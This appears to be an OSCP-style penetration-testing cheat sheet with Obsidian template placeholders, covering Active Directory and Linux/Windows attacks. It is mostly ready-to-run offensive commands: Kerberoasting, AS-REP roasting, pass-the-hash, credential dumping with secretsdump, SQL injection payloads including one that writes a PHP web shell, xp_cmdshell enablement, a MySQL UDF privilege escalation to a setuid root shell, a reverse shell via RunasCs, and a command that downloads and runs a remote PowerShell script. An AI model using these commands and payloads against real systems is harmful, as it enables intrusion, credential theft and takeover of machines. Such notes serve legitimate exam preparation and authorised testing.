bloodhound-python -u <% tp.frontmatter["USERNAME"] %> -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %> -ns <% tp.frontmatter["RHOST"] %> -c All
bloodhound-python -u <% tp.frontmatter["USERNAME"] %> -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %> -dc <% tp.frontmatter["RHOST"] %> -ns <% tp.frontmatter["RHOST"] %> --dns-tcp -no-pass -c ALL --zip


# Rubeus

Overpass the hash
Rubeus.exe kerberoast /user:<% tp.frontmatter["USERNAME"] %>

Pass the hash
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials

RunasCs
./RunasCs.exe -l 3 -d <% tp.frontmatter["DOMAIN"] %> "<% tp.frontmatter["USERNAME"] %>" '<% tp.frontmatter["PASSWORD"] %>' 'C:\Users\<% tp.frontmatter["USERNAME"] %>\Downloads\<FILE>.exe'
./RunasCs.exe -d <% tp.frontmatter["DOMAIN"] %> "<% tp.frontmatter["USERNAME"] %>" '<% tp.frontmatter["PASSWORD"] %>' cmd.exe -r <% tp.frontmatter["LHOST"] %>:<LPORT>

winexe
winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' //<% tp.frontmatter["RHOST"] %> cmd.exe
winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' --system //<% tp.frontmatter["RHOST"] %> cmd.exe
```






# Impacket
```bash
impacket-mssqlclient <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["RHOST"] %> -windows-auth

psexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
psexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>


wmiexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
wmiexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>


impacket-getTGT <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>
impacket-getTGT <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -dc-ip <% tp.frontmatter["RHOST"] %> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c

impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format <% tp.frontmatter["USERNAME"] %> -outputfile hashes


export KRB5CCNAME=<% tp.frontmatter["USERNAME"] %>.ccache
impacket-GetUserSPNs <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -k -dc-ip <% tp.frontmatter["RHOST"] %>.<% tp.frontmatter["RHOST"] %> -no-pass -request

export KRB5CCNAME=<% tp.frontmatter["USERNAME"] %>.ccache
impacket-secretsdump <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>
impacket-secretsdump -k <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>.<% tp.frontmatter["RHOST"] %> -no-pass -debug
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
impacket-secretsdump -dc-ip <% tp.frontmatter["RHOST"] %> <% tp.frontmatter["RHOST"] %>.LOCAL/svc_bes:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["RHOST"] %>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump medtech.com/joe:'Flowers1'@172.16.208.11

```


# Attacks

#### Bruteforce
```
./kerbrute -domain <% tp.frontmatter["DOMAIN"] %> -users <FILE> -passwords <FILE> -outputfile <FILE>
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<% tp.frontmatter["DOMAIN"] %> /outfile:<FILE>
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>

```


#### AsRepRoast
```bash
# Domain users ( Creds required)
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -request -format <% tp.frontmatter["USERNAME"] %> -outputfile <FILE>

# List of users (No Creds)
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/ -usersfile <FILE> -format <% tp.frontmatter["USERNAME"] %> -outputfile <FILE>


.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>

```
		
#### Kerberoasting
```powershell
impacket-GetUserSPNs <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -outputfile <FILE>

.\Rubeus.exe kerberoast /outfile:<FILE>

iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")

Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat <% tp.frontmatter["USERNAME"] %> | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```


#### OverPassTheHash / PassTheKey 
```bash

# Request-TGT 
impacket-getTGT <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %> -hashes <LMHASH>:<NTLMHASH>

# Req-TGT with password
impacket-getTGT <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>

# Ask and inject TGT
.\Rubeus.exe asktgt /domain:<% tp.frontmatter["DOMAIN"] %> /user:<% tp.frontmatter["USERNAME"] %> /rc4:<NTLMHASH> /ptt

.\PsExec.exe -accepteula \\<% tp.frontmatter["RHOST"] %> cmd
```

#### Execute commands remotely

```
impacket-psexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass
impacket-smbexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass
impacket-wmiexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass


```



### Web
```bash

# webdav
davtest [-auth <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>] -move -sendbd auto -url http://<% tp.frontmatter["RHOST"] %> #Uplaod .txt files and try to move it to other extensions
davtest [-auth <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>] -sendbd auto -url http://<% tp.frontmatter["RHOST"] %> #Try to upload every extension

cadaver <% tp.frontmatter["RHOST"] %>


Autorecon

autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports" 
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports"  --dirbuster.tool ffuf
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports" --dirbuster.tool ffuf -vv
# if you want to omit portscans of all port if you already have the list!
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports,all-tcp-ports" --dirbuster.tool ffuf -vv
```

### Check if running powershell or cmd
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```


### ssh-keygen
```bash
kali@kali:~$ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):fileup
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in fileupYour public key has been saved in fileup.pub
...

kali@kali:~$cat fileup.pub > authorized_keys
```

### mysql
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user();
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

### mysql sqli
```bash
#Error-based Payloads
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

#UNION-based payloads
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //

#Blind SQL Injections
#boolean-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
#time-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

#
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```


### mssql
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

### mssql sqli
```bash
#Manual Code Execution
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

### Password hash
```bash
echo -n "secret" | sha256sum
```


### Hash Identifier
![image](https://github.com/nuricheun/OSCP/assets/14031269/ca7ce199-47ed-4a09-bdc8-3184ea590ef5)



### POWERSHELL LOCAL ENUM
```bash
Get-LocalUser
```

### Proxychains
```bash
proxychains -q nmap -vvv -sT --top-ports 20 -Pn 172.16.208.10


# impacket ap-rep
proxychains -q impacket-GetNPUsers -dc-ip 172.16.234.10 -request  medtech.com/yoshi

# impacket kerbroasting
proxychains -q  impacket-GetUserSPNs -request -dc-ip 172.16.234.10 medtech.com/yoshi

```

### Sharphound
```bash
powershell -ep bypass
. .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```


### Powershell To Query Services
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
### when apps are installed on C:\ directly, we may be able to replace the executable files since they're not located on C:\Windows\System32
```

### PowerUp.ps1 
```bash
. .\PowerUp.ps1

## Check misconfig
Invoke-AllChecks

### Displays services the currnet user can modify
Get-ModifiableServiceFile
```

### winPEAS
```bash
# give winPEAS color
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

### query sheduled tasks
```bash
schtasks /query /fo LIST /v
```


### query service
```bash
Get-CimInstance -ClassName win32_service

#Check if the service can be started automatically(so we can reboot the machine)
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

### icacls
```bash
icacls "C:\xampp\apache\bin\httpd.exe"
```


### shutdown 
```bash
### With SeShutdownPrivilege we can reboot the machine
shutdown /r /t 0
```

### accesschk
```bash
.\accesschk.exe /accepteula -uwcqv yoshi servicename
```
![image](https://github.com/nuricheun/OSCP/assets/14031269/7c0c468a-3c88-4a71-8bbb-6b15fa85359f)

### sc
```bash
sc qc service
```
![image](https://github.com/nuricheun/OSCP/assets/14031269/987fc700-4a40-4445-8a8c-24b2b65da9f4)


### Priv Esc Windows Local Enumeration
```bash
# username and hostname
C:\Users\dave>whoami
whoami
clientwk220\dave

# Group memberships of the current user
whoami /groups

# Existing users and groups
net user || Get-LocalUser
net localgroup || Get-LocalGroup
Get-LocalGroupMember adminteam
Get-LocalGroupMember Administrators

# Operating system, version and architecture
systeminfo

# Network information
ipconfig /all
route print
#List all active network connections
netstat -ano

# Installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
## Additionally we should always check 32-bit and 64-bit Program Files directories located in C:\.
## Also we should review the contents of the Downloads directory of our user to find more potential programs.

# Running processes
Get-Process
```

### Search for juicy files on Windows
```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.pdf,*.log -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
```


### runas other user
```bash
runas /user:backupadmin cmd
```

### Cross Compiling
```bash
### compile C code to a 64- bit application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### exiftool
```bash
exiftool WElcomeLetter.pdf
```

### keepass
```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 
```

### Add user on windows
```bash
Net User /Add lazyadmin
net user admin password123!
net localgroup <groupname> <username> /add
```

### Linux enumeration: must search on directory traversal
```bash
/home/user/.ssh/id_ecdsa
/home/user/.ssh/id_eddsa
/home/user/.ssh/id_dsa
/home/user/.ssh/id_rsa
```

### Linux enumeration: search for backup files
```bash
# search for / (root), /tmp, /var/backups
```


### Linux Enumeration: automated with lse.sh
```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
chmod +x lse.sh
./lse.sh -l 1 -i
```

### Linux Privesc service enum
```bash
# show all processes running as root
ps aux | grep "^root"
dpkg -l | grep <program>
```

### gcc for mysql exploit (example): This is possbile when root's password is set to ''
```bash
# Add -fPIC when compiling for x64 system
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash'; chmod +s /tmp/rootbash');
exit
/tmp/rootbash -p
```

### ssh Port Forwarding
```bash
ssh -R <mykali-port>127:0.0.1:<service-port> <username>@<local-machine>
ssh -R 4444:127.0.0.1:3306 kali@192.168.x.x
ssh -R 127.0.0.1:2345:127.0.0.1:8000 kali@192.168.45.176

mysql -u root -h 127.0.0.1 -P 4444
select @@hostname;
```

### linux change to root user
```bash
su
```

### Password cracking with john
```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```


### Verify permissions on each file
```bash
ls -l /etc/shadow
```

### Generate hash from a password
```bash
# replace x of root's from /etc/passwd file (When have permissions)
openssl passwd 'passwd'

```

### Linux find writable and executable ###
```bash
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```
